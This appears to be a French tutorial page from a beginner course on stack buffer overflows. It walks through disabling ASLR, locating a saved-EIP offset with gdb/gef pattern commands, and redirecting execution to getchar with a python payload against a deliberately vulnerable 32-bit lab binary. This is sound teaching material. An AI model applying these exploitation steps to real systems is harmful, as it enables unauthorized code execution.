---
title: "Passons à la pratique!"
slug: "passons-à-la-pratique"
chapter: "fr-introduction-aux-buffer-overflow"
priority: 1
editor: "wysiwyg"
revisionCount: 5
id: 24
createdAt: "2020-05-06T14:12:52Z"
createdBy: "z3pp"
updatedAt: "2020-05-07T15:07:13Z"
updatedBy: "z3pp"
ownedBy: "z3pp"
views: 10
---
<h4 id="bkmrk-premi%C3%A8re-phase-de-l%27">Première phase de l'exploitation</h4>
<p id="bkmrk-nous-allons-desormai">Nous allons desormais nous appuyer sur le programme précédement vu afin de l'exploiter</p>
<p id="bkmrk-pour-commencer-on-va">Pour commencer on va désactiver l'ASLR avec cette commande:</p>
<p id="bkmrk-echo-0-%7C-sudo-tee-%2Fp"><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>
<p id="bkmrk-%2Aaslr%3A-prot%C3%A9ction-qu">*ASLR: protection qui va rendre aléatoire certains espace d'adressage</p>
<p id="bkmrk-on-a-vu-plus-t%C3%B4t-com">On a vu plus tôt comment le programme fonctionnait en lui donnant quelques "A"</p>
<p id="bkmrk-maintenant-voyons-vo">Maintenant voyons voir ce qu'il se passe lorsque nous lui en donnons plus que prévu</p>
<pre id="bkmrk-%24-.%2Fvuln-aaaaaaaaaaa"><code class="language-shell">$ ./vuln 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
��
Segmentation fault (core dumped)
$</code></pre>
<p id="bkmrk-on-recoit-un-beau-se">On reçoit un beau segmentation fault (le programme a tout simplement tenté d'acceder à l'adresse 0x41414141, donc nos "A")</p>
<p id="bkmrk-maintenant-jettons-u">Maintenant jettons un petit coup d'oeil à notre stack:</p>
<pre id="bkmrk-0xbfff0000%3A-41-41-41"><code class="language-">0xbfff0000: 41 41 41 41
0xbfff0004: 41 41 41 41
0xbfff0008: 41 41 41 00
...
0xbfff0020: 41 41 41 41  &lt;- sEBP
0xbfff0024: 41 41 41 41  &lt;- sEIP</code></pre>
<p id="bkmrk-on-vient-tout-simple">On vient tout simplement d'overwrite notre sauvegarde d'EIP</p>
<p id="bkmrk-la-vuln%C3%A9rabilit%C3%A9-se-">La vulnérabilité se trouve ici:</p>
<pre id="bkmrk-%2F%2F-vuln%28%29-char-buffe"><code class="language-C">// vuln()
char buffer[32];
read(0, buffer, 128);</code></pre>
<p id="bkmrk-on-va-lire-128-carac">On va lire 128 caracteres du stdin pour en mettre seulement 32 dans la variable <code>buffer</code>, donc logiquement si on entre plus que 32 caractere on va overwrite toutes les addresses qui suivent</p>
<p id="bkmrk-bon%2C-c%27est-bien-beau">Bon, c'est bien beau d'overwrite la sauvegarde de notre return instruction pointer avec des "A" mais maintenant comment va réagir le programme si nous remplacons ces "A" (plus précisément les "A" qui se trouve dans notre sauvegarde d'EIP) par une adresse valide? Une fonction par exemple :)</p>
<p id="bkmrk-je-vais-pour-ce-prem">Je vais pour ce premier exemple utilser la fonction <code>getchar</code> qui va comme <code>read</code> attendre une entrée utilisateur</p>
<h5 id="bkmrk-r%C3%A9cuperation-de-l%27of">Récuperation de l'offset</h5>
<p id="bkmrk-pour-pouvoir-remplac">Pour pouvoir remplacer nos "A" par une adresse valide nous devons d'abord trouver le nombre de "A" à parcourir avant d'arriver à la sauvegarde d'EIP, notre "offset", il existe plusieurs méthodes pour pouvoir faire ça, je vais citer ici la plus simple, ça consiste simplement à envoyer un "pattern" au programme, puis voir où le programme plante, pour faire ça je vais utiliser <code>gdb</code> (debugger de GNU) avec l'extension <code>gef</code></p>
<p id="bkmrk-je-vais-donc-lancer-">Je vais donc lancer gdb sur notre programme <code>vuln</code></p>
<pre id="bkmrk-%24-gdb-vuln-reading-s"><code class="language-Python">$ gdb vuln 
Reading symbols from vuln...
(No debugging symbols found in vuln)
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 8.3 using Python engine 3.7
gef➤</code></pre>
<p id="bkmrk-on-va-donc-commencer">On va donc commencer par générer notre pattern avec la commande <code>pattern create &lt;nombre de chars.&gt;</code></p>
<pre id="bkmrk-gef%E2%9E%A4-pattern-c-100-%5B"><code class="language-Python">gef➤  pattern c 100
[+] Generating a pattern of 100 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
gef➤  </code></pre>
<p id="bkmrk-on-va-ensuite-lancer">On va ensuite lancer le programme puis lui envoyer notre pattern avec la commande <code>run</code></p>
<pre id="bkmrk-gef%E2%9E%A4-r-starting-prog"><code class="language-Python">gef➤  r
Starting program: /home/zepp/pwn/exploits/i386/ret2shellcode/vuln 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaabl # notre jolie pattern généré plus haut
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
...</code></pre>
<p id="bkmrk-donc-on-voit-bien-qu">Donc on voit bien que le programme plante car il tente d'acceder à l'adresse <code>0x6161616c</code>, qui est en réalité: "laaa" (suite de caractere unique dans notre pattern)</p>
<p id="bkmrk-maintenant-on-va-uti">Maintenant on va utiliser la commande <code>pattern search &lt;fault addr&gt;</code> pour pouvoir trouver notre offset</p>
<pre id="bkmrk-gef%E2%9E%A4-pattern-s-0x616"><code class="language-Python">gef➤  pattern s 0x6161616c
[+] Searching '0x6161616c'
[+] Found at offset 44 (little-endian search) likely
# [+] Found at offset 41 (big-endian search) 
gef➤  </code></pre>
<p id="bkmrk-et-voila-on-vient-de">Et voila on vient de trouver notre offset!</p>
<p id="bkmrk-il-nous-faudra-donc-">Il nous faudra donc parcourir 44 "A" avant de tomber sur notre sauvegarde d'EIP</p>
<p id="bkmrk-%3C...%3E">Maintenant pour en être sûr, on va envoyer au programme 44 "A" suivi de 4 "B"</p>
<pre id="bkmrk-gef%E2%9E%A4-r-%3C-%3C%28python--c"><code class="language-Python">gef➤  r &lt; &lt;(python -c 'print "A"*44+"B"*4')  # On automatise ce processus avec python
Starting program: /home/zepp/pwn/exploits/i386/ret2shellcode/vuln &lt; &lt;(python -c 'print "A"*44+"B"*4')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
@��

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
...</code></pre>
<p id="bkmrk-voila%2C-on-voit-bien-">Voila, on voit bien que le programme crash car il tente d'acceder à l'adresse 0x42424242 qui sont en réalité nos "B" en hexa'</p>
<h5 id="bkmrk-hijack-de-notre-sauv">Hijack de notre sauvegarde d'EIP</h5>
<p id="bkmrk-maintenant-on-va-jus">Maintenant on va juste modifier nos "B" par une adresse existante, comme je l'ai cité plus haut, je vais choisir la fonction <code>getchar</code> (de la librairie stdio que l'on load dans notre programme)</p>
<p id="bkmrk-pour-r%C3%A9cup%C3%A9rer-l%27adr">Pour récupérer l'adresse de cette fonction je vais tout simplement avec gdb taper la commande <code>info address getchar</code></p>
<pre id="bkmrk-gef%E2%9E%A4-info-address-ge"><code class="language-Python">gef➤  info address getchar
Symbol "getchar" is at 0xf7e33820 in a file compiled without debugging.
gef➤  </code></pre>
<p id="bkmrk-pour-ma-part-l%27addre">Pour ma part l'addresse de <code>getchar</code> est <code>0xf7e33820</code>, on va donc mettre ça en little endian (qui est le format utiliser en i386) ce qui nous donne <code>0x2038e3f7</code> en envera donc la str "<code>\x20\x38\xe3\xf7</code>" grace à python</p>
<p id="bkmrk-on-va-donc-essayer%3A">On va donc essayer:</p>
<pre id="bkmrk-gef%E2%9E%A4-r-%3C-%3C%28python--c-0"><code class="language-Python">gef➤  r &lt; &lt;(python -c 'print "A"*44+"\x20\x38\xe3\xf7"')
Starting program: /home/zepp/pwn/exploits/i386/ret2shellcode/vuln &lt; &lt;(python -c 'print "A"*44+"\x20\x38\xe3\xf7"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 8��
izeiuheiuzhizhf  # la fonction getchar s'execute
...</code></pre>
<p id="bkmrk-on-remarque-donc-que">On remarque donc que la fonction <code>getchar</code> a bien été appelé, tout marche comme prévu :p</p>
